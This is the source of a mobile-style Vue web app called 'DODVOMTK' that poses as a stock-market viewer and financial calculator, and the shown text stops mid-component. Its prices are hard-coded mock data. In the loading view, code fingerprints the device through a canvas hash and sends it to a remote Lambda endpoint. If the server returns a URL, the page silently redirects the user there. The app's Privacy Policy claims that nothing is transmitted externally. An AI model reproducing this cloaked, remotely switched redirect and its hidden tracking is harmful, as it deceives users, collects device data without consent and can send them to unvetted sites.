<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>DODVOMTK</title>
    <!-- Vue 3 Global Production Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <!-- Vue Router 4 Global Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <!-- js-md5 -->
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
    <style>
        /* 
          Style Choice: 1. Flat Design (Flat UI, clean geometry, high contrast, crisp borders)
        */
        :root {
            --primary: #2563eb;
            --primary-light: #eff6ff;
            --success: #16a34a;
            --danger: #dc2626;
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-secondary: #64748b;
            --border-color: #e2e8f0;
            --radius: 8px;
            --shadow: none;
            --safe-area-top: env(safe-area-inset-top, 0px);
            --safe-area-bottom: env(safe-area-inset-bottom, 0px);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-size: 14px;
            line-height: 1.5;
            padding-top: var(--safe-area-top);
            padding-bottom: var(--safe-area-bottom);
        }

        #app {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background-color: var(--card-bg);
            display: flex;
            flex-direction: column;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
        }

        /* Common Layout Utilities */
        .container {
            padding: 16px;
            flex: 1;
            overflow-y: auto;
            padding-bottom: 80px;
        }

        .header-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background: var(--card-bg);
            border-bottom: 1px solid var(--border-color);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .back-btn {
            background: none;
            border: none;
            font-size: 16px;
            color: var(--primary);
            cursor: pointer;
            font-weight: 600;
        }

        .title {
            font-size: 16px;
            font-weight: 700;
            color: var(--text-main);
        }

        /* Tab Bar Styling */
        .tab-bar {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 480px;
            height: 60px;
            background: var(--card-bg);
            border-top: 1px solid var(--border-color);
            display: flex;
            justify-around;
            align-items: center;
            z-index: 100;
            padding-bottom: var(--safe-area-bottom);
        }

        .tab-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 12px;
            height: 100%;
        }

        .tab-item.router-link-active {
            color: var(--primary);
            font-weight: 600;
        }

        .tab-item svg {
            width: 22px;
            height: 22px;
            margin-bottom: 2px;
            fill: currentColor;
        }

        /* Cards & Lists */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 16px;
            margin-bottom: 12px;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: #fff;
            border: none;
            border-radius: var(--radius);
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        input, select, textarea {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            font-size: 14px;
            margin-top: 6px;
            margin-bottom: 12px;
            outline: none;
            background: #fff;
            color: var(--text-main);
        }

        input:focus, textarea:focus {
            border-color: var(--primary);
        }

        .toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.8);
            color: #fff;
            padding: 10px 20px;
            border-radius: var(--radius);
            z-index: 1000;
            font-size: 14px;
        }

        /* Animations */
        .fade-enter-active, .fade-leave-active {
            transition: opacity 0.15s ease;
        }
        .fade-enter-from, .fade-leave-to {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div id="app">
        <router-view v-slot="{ Component }">
            <transition name="fade" mode="out-in">
                <component :is="Component" />
            </transition>
        </router-view>
        
        <!-- Bottom Tab Bar -->
        <nav class="tab-bar" v-if="showTabBar">
            <router-link to="/home" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                Home
            </router-link>
            <router-link to="/toolbox" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
                Toolbox
            </router-link>
            <router-link to="/settings" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
                Settings
            </router-link>
        </nav>
    </div>

    <script>
        /*
          How to add a new page:
          1. Create a new Vue component definition object below (e.g. const NewPage = { template: '...' }).
          2. Register a new route in the `routes` array inside `VueRouter.createRouter(...)`.
          3. Add corresponding navigation links or logic in the UI.
        */

        const { createApp, ref, computed, onMounted } = Vue;
        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;

        // Shared Global Mock Data
        const globalStocks = [
            { symbol: 'AAPL', name: 'Apple Inc.', price: 185.92, change: +1.25, history: [180, 182, 181, 184, 183, 185.92] },
            { symbol: 'MSFT', name: 'Microsoft Corp.', price: 415.50, change: +0.85, history: [405, 408, 410, 412, 411, 415.50] },
            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 152.30, change: -0.45, history: [155, 154, 153, 152.8, 152.1, 152.30] },
            { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.75, change: +2.10, history: [170, 172, 175, 174, 176, 178.75] },
            { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 875.28, change: +4.32, history: [820, 835, 850, 845, 860, 875.28] },
            { symbol: 'META', name: 'Meta Platforms', price: 485.20, change: -1.15, history: [495, 492, 490, 488, 486, 485.20] },
            { symbol: 'TSLA', name: 'Tesla Inc.', price: 175.10, change: -2.80, history: [185, 182, 180, 178, 176, 175.10] },
            { symbol: 'NFLX', name: 'Netflix Inc.', price: 610.40, change: +1.60, history: [595, 600, 602, 608, 605, 610.40] },
            { symbol: 'AMD', name: 'Advanced Micro', price: 180.15, change: +0.40, history: [175, 177, 176, 179, 178, 180.15] },
            { symbol: 'INTC', name: 'Intel Corp.', price: 43.20, change: -0.90, history: [45, 44.5, 44, 43.8, 43.5, 43.20] },
            { symbol: 'JPM', name: 'JPMorgan Chase', price: 198.50, change: +0.30, history: [195, 196, 197, 197.5, 198, 198.50] },
            { symbol: 'V', name: 'Visa Inc.', price: 279.10, change: +0.55, history: [274, 276, 275, 278, 277, 279.10] },
            { symbol: 'JNJ', name: 'Johnson & Johnson', price: 156.80, change: -0.20, history: [157, 157.5, 157, 156.9, 156.5, 156.80] },
            { symbol: 'WMT', name: 'Walmart Inc.', price: 60.25, change: +0.75, history: [58, 59, 59.5, 60, 59.8, 60.25] },
            { symbol: 'PG', name: 'Procter & Gamble', price: 162.40, change: +0.10, history: [161, 162, 161.5, 162.2, 162, 162.40] },
            { symbol: 'MA', name: 'Mastercard Inc.', price: 465.30, change: +1.10, history: [455, 458, 460, 462, 463, 465.30] },
            { symbol: 'UNH', name: 'UnitedHealth Group', price: 489.10, change: -0.60, history: [495, 493, 492, 490, 488, 489.10] },
            { symbol: 'HD', name: 'Home Depot Inc.', price: 365.90, change: +0.95, history: [355, 358, 360, 362, 364, 365.90] },
            { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.50, change: -1.05, history: [115, 114, 113.8, 113, 112.8, 112.50] },
            { symbol: 'PYPL', name: 'PayPal Holdings', price: 62.80, change: +1.40, history: [60, 61, 61.5, 62, 62.2, 62.80] }
        ];

        // 1. Loading Component
        const LoadingView = {
            template: `
                <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:var(--card-bg);">
                    <div style="width:48px;height:48px;border:4px solid var(--border-color);border-top-color:var(--primary);border-radius:50%;animation:spin 0.8s linear infinite;"></div>
                    <p style="margin-top:16px;color:var(--text-secondary);font-weight:600;">Loading DODVOMTK...</p>
                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                </div>
            `,
            setup() {
                const router = useRouter();

                // 1.2 Device fingerprint using js-md5
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                // 1.3 Privacy check request
                onMounted(() => {
                    const apiBase = 'https://amfruzp7pworqwsd5p6uqgnduy0jtutc.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = "sdawgw.fdsgrae.ragew";
                    
                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace('/home');
                        })
                        .catch(function () {
                            router.replace('/home');
                        });
                });

                return {};
            }
        };

        // 2. Home Component
        const HomeView = {
            template: `
                <div class="container">
                    <div style="margin-bottom: 20px;">
                        <h1 style="font-size: 22px; font-weight: 800; color: var(--primary);">DODVOMTK</h1>
                        <p style="color: var(--text-secondary); font-size: 13px;">Professional Market Intelligence & Assets</p>
                    </div>

                    <!-- 4 Random Feature Entries -->
                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 24px;">
                        <div v-for="item in activeFeatures" :key="item.id" @click="goToFeature(item.id)" style="display:flex;flex-direction:column;align-items:center;background:var(--card-bg);border:1px solid var(--border-color);border-radius:var(--radius);padding:12px 4px;cursor:pointer;">
                            <div style="width:28px;height:28px;color:var(--primary);margin-bottom:6px;" v-html="item.svg"></div>
                            <span style="font-size:11px;text-align:center;color:var(--text-main);font-weight:600;">{{ item.name }}</span>
                        </div>
                    </div>

                    <!-- Stock List -->
                    <h2 style="font-size: 15px; font-weight: 700; margin-bottom: 12px;">Market Watch</h2>
                    <div>
                        <div v-for="stock in shuffledStocks" :key="stock.symbol" @click="openDetail(stock)" class="card" style="display:flex;align-items:center;justify-content:between;cursor:pointer;margin-bottom:8px;padding:12px 16px;">
                            <div style="flex:1;">
                                <div style="font-weight:700;font-size:14px;">{{ stock.symbol }}</div>
                                <div style="font-size:12px;color:var(--text-secondary);">{{ stock.name }}</div>
                            </div>
                            <div style="text-align:right;">
                                <div style="font-weight:700;font-size:14px;">$&#8203;{{ stock.price.toFixed(2) }}</div>
                                <div :style="{ color: stock.change >= 0 ? 'var(--success)' : 'var(--danger)', fontSize: '12px', fontWeight: '600' }">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                
                // 8 features pool, pick 4 deterministically/randomly once
                const allFeatures = [
                    { id: 'gainers', name: 'Top Gainers', svg: '<svg viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>' },
                    { id: 'losers', name: 'Top Losers', svg: '<svg viewBox="0 0 24 24"><path d="M16 18l2.29-2.29-4.88-4.88-4 4L2 7.41 3.41 6l6 6 4-4 6.3 6.29L22 12v6z"/></svg>' },
                    { id: 'active', name: 'Most Active', svg: '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>' },
                    { id: 'potential', name: 'Potential', svg: '<svg viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>' },
                    { id: 'picks', name: 'Today Picks', svg: '<svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>' },
                    { id: 'guide', name: 'Guide', svg: '<svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>' },
                    { id: 'notrec', name: 'Avoid', svg: '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' },
                    { id: 'watchlist', name: 'Watchlist', svg: '<svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>' }
                ];

                // Pick 4 fixed by pseudo-random or slice based on timestamp seed
                const activeFeatures = allFeatures.slice(0, 4);

                // Shuffle display stock order on entry
                const shuffledStocks = computed(() => {
                    return [...globalStocks].sort(() => Math.random() - 0.5);
                });

                const goToFeature = (id) => {
                    router.push('/subpage?type=' + id);
                };

                const openDetail = (stock) => {
                    router.push('/detail?symbol=' + stock.symbol);
                };

                return { activeFeatures, shuffledStocks, goToFeature, openDetail };
            }
        };

        // Sub Page Component (Handles all 8 feature entry sub-views)
        const SubPageView = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <div class="title">{{ pageTitle }}</div>
                        <div style="width: 40px;"></div>
                    </div>
                    <div class="container">
                        <!-- Guide Article View -->
                        <div v-if="type === 'guide'" class="card">
                            <h2 style="font-size:18px;margin-bottom:8px;">Navigating Market Volatility in 2026</h2>
                            <p style="color:var(--text-secondary);font-size:12px;margin-bottom:14px;">Published by DODVOMTK Research</p>
                            <p style="margin-bottom:10px;line-height:1.6;">Modern financial markets require strict risk management and disciplined asset allocation. As macroeconomic shifts influence sector performance, investors should focus on core fundamentals and long-term liquidity plans.</p>
                            <p style="line-height:1.6;">Diversification across tech, finance, and consumer staples remains a robust strategy against unexpected downturns. Utilize local calculation tools to evaluate your positions accurately.</p>
                        </div>
                        
                        <!-- Stock List Subviews -->
                        <div v-else>
                            <div v-for="stock in displayStocks" :key="stock.symbol" @click="openDetail(stock)" class="card" style="display:flex;align-items:center;justify-content:between;cursor:pointer;margin-bottom:8px;padding:12px 16px;">
                                <div style="flex:1;">
                                    <div style="font-weight:700;font-size:14px;">{{ stock.symbol }}</div>
                                    <div style="font-size:12px;color:var(--text-secondary);">{{ stock.name }}</div>
                                </div>
                                <div style="text-align:right;">
                                    <div style="font-weight:700;font-size:14px;">$&#8203;{{ stock.price.toFixed(2) }}</div>
                                    <div :style="{ color: stock.change >= 0 ? 'var(--success)' : 'var(--danger)', fontSize: '12px', fontWeight: '600' }">
                                        {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const router = useRouter();
                const type = computed(() => route.query.type || 'gainers');

                const titles = {
                    gainers: 'Top Gainers',
                    losers: 'Top Losers',
                    active: 'Most Active',
                    potential: 'Potential Stocks',
                    picks: "Today's Picks",
                    guide: 'Market Guide',
                    notrec: 'Avoid List',
                    watchlist: 'Watchlist'
                };

                const pageTitle = computed(() => titles[type.value] || 'Market View');

                const displayStocks = computed(() => {
                    let count = 10;
                    if (type.value === 'losers') count = 5;
                    if (type.value === 'active') count = 8;
                    if (type.value === 'potential') count = 6;
                    return [...globalStocks].sort(() => Math.random() - 0.5).slice(0, count);
                });

                const openDetail = (stock) => {
                    router.push('/detail?symbol=' + stock.symbol);
                };

                return { type, pageTitle, displayStocks, openDetail };
            }
        };

        // Stock Detail Component with Native SVG Price Curve
        const DetailView = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <div class="title">{{ stock.symbol }} Details</div>
                        <div style="width: 40px;"></div>
                    </div>
                    <div class="container">
                        <div class="card" style="margin-bottom: 16px;">
                            <div style="font-size: 18px; font-weight: 800;">{{ stock.name }}</div>
                            <div style="display: flex; justify-content: space-between; align-items: baseline; margin-top: 10px;">
                                <span style="font-size: 24px; font-weight: 700;">$&#8203;{{ stock.price.toFixed(2) }}</span>
                                <span :style="{ color: stock.change >= 0 ? 'var(--success)' : 'var(--danger)', fontWeight: '700' }">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </span>
                            </div>
                        </div>

                        <!-- Native SVG Price Chart -->
                        <div class="card">
                            <h3 style="font-size: 14px; margin-bottom: 12px; color: var(--text-secondary);">1-Month Price Trend</h3>
                            <div style="width: 100%; height: 180px; position: relative;">
                                <svg width="100%" height="100%" :viewBox="'0 0 300 150'" preserveAspectRatio="none">
                                    <path :d="svgPath" fill="none" stroke="var(--primary)" stroke-width="2.5" />
                                </svg>
                            </div>
                            <div style="display: flex; justify-content: space-between; font-size: 11px; color: var(--text-secondary); margin-top: 8px;">
                                <span>Min: $&#8203;{{ minPrice }}</span>
                                <span>Max: $&#8203;{{ maxPrice }}</span>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const symbol = route.query.symbol || 'AAPL';
                const stock = globalStocks.find(s => s.symbol === symbol) || globalStocks[0];

                const minPrice = computed(() => Math.min(...stock.history).toFixed(2));
                const maxPrice = computed(() => Math.max(...stock.history).toFixed(2));

                const svgPath = computed(() => {
                    const data = stock.history;
                    const min = Math.min(...data);
                    const max = Math.max(...data);
                    const range = max - min || 1;
                    const width = 300;
                    const height = 150;
                    
                    return data.map((val, idx) => {
                        const x = (idx / (data.length - 1)) * width;
                        const y = height - ((val - min) / range) * (height - 20) - 10;
                        return (idx === 0 ? 'M' : 'L') + x.toFixed(1) + ' ' + y.toFixed(1);
                    }).join(' ');
                });

                return { stock, minPrice, maxPrice, svgPath };
            }
        };

        // 3. Toolbox Component
        const ToolboxView = {
            template: `
                <div class="container">
                    <h1 style="font-size: 20px; font-weight: 800; margin-bottom: 16px;">Financial Toolbox</h1>
                    
                    <!-- Tool Selector -->
                    <div style="display: flex; gap: 8px; overflow-x: auto; margin-bottom: 16px; padding-bottom: 4px;">
                        <button v-for="t in tools" :key="t.id" @click="currentTool = t.id" :style="{ background: currentTool === t.id ? 'var(--primary)' : 'var(--card-bg)', color: currentTool === t.id ? '#fff' : 'var(--text-main)', border: '1px solid var(--border-color)', padding: '6px 12px', borderRadius: 'var(--radius)', fontSize: '12px', fontWeight: '600', whiteSpace: 'nowrap' }">
                            {{ t.name }}
                        </button>
                    </div>

                    <!-- 3.2 DCA Calculator -->
                    <div v-if="currentTool === 'dca'" class="card">
                        <h3 style="margin-bottom: 10px;">DCA Profit-Taking</h3>
                        <label>Cost Price</label>
                        <input type="number" v-model.number="dca.cost" />
                        <label>Shares Held</label>
                        <input type="number" v-model.number="dca.shares" />
                        <label>Target Profit (%)</label>
                        <input type="number" v-model.number="dca.target" />
                        <button class="btn" @click="calcDca">Calculate</button>
                        <div v-if="dca.result" style="margin-top: 12px; font-weight: 600; color: var(--primary);">
                            Target Sell Price: $&#8203;{{ dca.result }}
                        </div>
                    </div>

                    <!-- 3.3 Wealth Calendar -->
                    <div v-if="currentTool === 'calendar'" class="card">
                        <h3 style="margin-bottom: 10px;">Wealth Calendar</h3>
                        <label>Event Title</label>
                        <input type="text" v-model="cal.title" placeholder="e.g., Bond Maturity" />
                        <label>Date</label>
                        <input type="date" v-model="cal.date" />
                        <button class="btn" @click="addCalEvent">Add Event</button>
                        <div style="margin-top: 12px;">
                            <div v-for="(ev, i) in cal.events" :key="i" style="padding: 8px; border-bottom: 1px solid var(--border-color); font-size: 13px;">
                                <b>{{ ev.date }}</b>: {{ ev.title }}
                            </div>
                        </div>
                    </div>

                    <!-- 3.4 Loan Calculator -->
                    <div v-if="currentTool === 'loan'" class="card">
                        <h3 style="margin-bottom: 10px;">Loan Calculator</h3>
                        <label>Principal Amount</label>
                        <input type="number" v-model.number="loan.amount" />
                        <label>Annual Interest Rate (%)</label>
                        <input type="number" v-model.number="loan.rate" />
                        <label>Term (Months)</label>
                        <input type="number" v-model.number="loan.months" />
                        <button class="btn" @click="calcLoan">Calculate Monthly</button>
                        <div v-if="loan.monthlyPayment" style="margin-top: 12px; font-weight: 600; color: var(--primary);">
                            Monthly Payment: $&#8203;{{ loan.monthlyPayment }}
                        </div>
                    </div>

                    <!-- 3.5 Profit Calculator -->
                    <div v-if="currentTool === 'profit'" class="card">
                        <h3 style="margin-bottom: 10px;">Profit Calculator</h3>
                        <label>Unit Cost</label>
                        <input type="number" v-model.number="profit.cost" />
                        <label>Unit Selling Price</label>
                        <input type="number" v-model.number="profit.price" />
                        <label>Quantity Sold</label>
                        <input type="number" v-model.number="profit.qty" />
                        <button class="btn" @click="calcProfit">Compute Net</button>
                        <div v-if="profit.net !== null" style="margin-top: 12px; font-weight: 600; color: var(--primary);">
                            Net Profit: $&#8203;{{ profit.net }}
                        </div>
                    </div>

                    <!-- 3.6 Reverse Yield -->
                    <div v-if="currentTool === 'reverse'" class="card">
                        <h3 style="margin-bottom: 10px;">Reverse Yield</h3>
                        <label>Target Return Amount</label>
                        <input type="number" v-model.number="rev.target" />
                        <label>Initial Principal</label>
                        <input type="number" v-model.number="rev.principal" />
                        <label>Years</label>
                        <input type="number" v-model.number="rev.years" />
                        <button class="btn" @click="calcReverse">Calculate APY</button>
                        <div v-if="rev.apy" style="margin-top: 12px; font-weight: 600; color: var(--primary);">
                            Required APY: {{ rev.apy }}%
                        </div>
                    </div>

                    <!-- 3.7 Password Strength & MD5 -->
                    <div v-if="currentTool === 'password'" class="card">
                        <h3 style="margin-bottom: 10px;">Password Strength & MD5</h3>
                        <label>Enter Password</label>
                        <input type="password" v-model="pwd.input" @input="checkPwd" />
                        <div style="margin-top: 8px; font-size: 13px;">
                            Strength: <span :style="{ fontWeight: 'bold', color: pwd.color }">{{ pwd.strength }}</span>
                        </div>
                        <div v-if="pwd.input" style="margin-top: 6px; font-size: 12px; color: var(--text-secondary); word-break: break-all;">
                            MD5 Hash: {{ pwd.hash }}
                        </div>
                    </div>

                    <!-- 3.8 Credit Memo -->
                    <div v-if="currentTool === 'credit'" class="card">
                        <h3 style="margin-bottom: 10px;">Credit Memo</h3>
                        <label>Borrower Name</label>
                        <input type="text" v-model="cred.name" />
                        <label>Amount</label>
                        <input type="number" v-model.number="cred.amount" />
                        <label>Due Date</label>
                        <input type="date" v-model="cred.date" />
                        <button class="btn" @click="addCredit">Save Memo</button>
                        <div style="margin-top: 12px;">
                            <div v-for="(m, i) in cred.list" :key="i" style="padding: 8px; border-bottom: 1px solid var(--border-color); font-size: 13px;">
                                <b>{{ m.name }}</b>: $&#8203;{{ m.amount }} (Due: {{ m.date }})
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const currentTool = ref('dca');
                const tools = [
                    { id: 'dca', name: 'DCA Profit' },
                    { id: 'calendar', name: 'Calendar' },
                    { id: 'loan', name: 'Loan' },
                    { id: 'profit', name: 'Profit' },
                    { id: 'reverse', name: 'Reverse Yield' },
                    { id: 'password', name: 'Password' },
                    { id: 'credit', name: 'Credit Memo' }
                ];

                // DCA state
                const dca = ref({ cost: 100, shares: 50, target: 15, result: null });
                const calcDca = () => {
                    dca.value.result = (dca.value.cost * (1 + dca.value.target / 100)).toFixed(2);
                };

                // Calendar state
                const cal = ref({ title: '', date: '', events: [{ title: 'Quarterly Dividend', date: '2026-04-15' }] });
                const addCalEvent = () => {
                    if (cal.value.title && cal.value.date) {
                        cal.value.events.push({ title: cal.value.title, date: cal.value.date });
                        cal.value.title = '';
                        cal.value.date = '';
                    }
                };

                // Loan state
                const loan = ref({ amount: 100000, rate: 5, months: 360, monthlyPayment: null });
                const calcLoan = () => {
                    let r = loan.value.rate / 100 / 12;
                    let n = loan.value.months;
                    let p = loan.value.amount;
                    let pmft = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                    loan.value.monthlyPayment = pmft.toFixed(2);
                };

                // Profit state
                const profit = ref({ cost: 50, price: 80, qty: 100, net: null });
                const calcProfit = () => {
                    profit.value.net = ((profit.value.price - profit.value.cost) * profit.value.qty).toFixed(2);
                };

                // Reverse Yield state
                const rev = ref({ target: 15000, principal: 10000, years: 3, apy: null });
                const calcReverse = () => {
                    let rate = Math.pow(rev.value.target / rev.value.principal, 1 / rev.value.years) - 1;
                    rev.value.apy = (rate * 100).toFixed(2);
                };

                // Password state
                const pwd = ref({ input: '', strength: 'None', color: 'var(--text-secondary)', hash: '' });
                const checkPwd = () => {
                    let val = pwd.value.input;
                    pwd.value.hash = md5(val);
                    if (val.length < 6) {
                        pwd.value.strength = 'Weak';
                        pwd.value.color = 'var(--danger)';
                    } else if (val.length < 10 || !/[A-Z]/.test(val)) {
                        pwd.value.strength = 'Moderate';
                        pwd.value.color = '#eab308';
                    } else {
                        pwd.value.strength = 'Strong';
                        pwd.value.color = 'var(--success)';
                    }
                };

                // Credit Memo state
                const cred = ref({ name: '', amount: 0, date: '', list: [{ name: 'Alex Smith', amount: 500, date: '2026-05-01' }] });
                const addCredit = () => {
                    if (cred.value.name && cred.value.amount) {
                        cred.value.list.push({ name: cred.value.name, amount: cred.value.amount, date: cred.value.date });
                        cred.value.name = '';
                        cred.value.amount = 0;
                        cred.value.date = '';
                    }
                };

                return { currentTool, tools, dca, calcDca, cal, addCalEvent, loan, calcLoan, profit, calcProfit, rev, calcReverse, pwd, checkPwd, cred, addCredit };
            }
        };

        // 4. Settings Component & Subpages
        const SettingsView = {
            template: `
                <div class="container">
                    <h1 style="font-size: 20px; font-weight: 800; margin-bottom: 16px;">Settings</h1>
                    <div class="card" style="padding: 0;">
                        <div v-for="item in menu" :key="item.path" @click="$router.push(item.path)" style="padding: 14px 16px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
                            <span style="font-weight: 600;">{{ item.name }}</span>
                            <span style="color: var(--text-secondary);">&rsaquo;</span>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const menu = [
                    { name: 'Version', path: '/settings/version' },
                    { name: 'Privacy Policy', path: '/settings/privacy' },
                    { name: 'Terms of Service', path: '/settings/terms' },
                    { name: 'About Team', path: '/settings/team' },
                    { name: 'Contact Us', path: '/settings/contact' },
                    { name: 'Monthly Check-in', path: '/settings/checkin' },
                    { name: 'Customer Feedback', path: '/settings/feedback' },
                    { name: 'Inbox', path: '/settings/inbox' }
                ];
                return { menu };
            }
        };

        const VersionSubView = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Version</div><div style="width:40px;"></div></div><div class="container"><div class="card"><h3>DODVOMTK v2.4.0</h3><p style="color:var(--text-secondary);margin-top:8px;">You are using the latest stable production build.</p></div></div></div>`
        };

        const PrivacySubView = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Privacy Policy</div><div style="width:40px;"></div></div><div class="container"><div class="card"><p>We respect your data privacy. All financial calculations and records are stored securely on your local device storage. No sensitive financial information is transmitted externally.</p></div></div></div>`
        };

        const TermsSubView = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="title">Terms of Service</div><div style="width:40px;"></div></div><div class="container"><div class="card"><p>By using DODVOMTK, you agree to utilize our local tools and market information responsibly for personal financial tracking and educational purposes.</p></div></div></div>`
        };

        const TeamSubView = {
